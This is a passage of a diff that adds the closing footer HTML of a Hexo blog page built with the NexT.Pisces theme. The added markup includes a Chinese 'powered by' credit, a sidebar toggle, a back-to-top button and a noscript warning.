+  <div class="powered-by">由 <a href="https://hexo.io/" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.js.org/pisces/" rel="noopener" target="_blank">NexT.Pisces</a> 强力驱动
+  </div>
+
+    </div>
+  </footer>
+
+  
+  <div class="toggle sidebar-toggle" role="button">
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+  </div>
+  <div class="sidebar-dimmer"></div>
+  <div class="back-to-top" role="button" aria-label="返回顶部">
+    <i class="fa fa-arrow-up fa-lg"></i>
+    <span>0%</span>
+  </div>
+
+<noscript>
+  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
+</noscript>
+
+</body>
+</html>
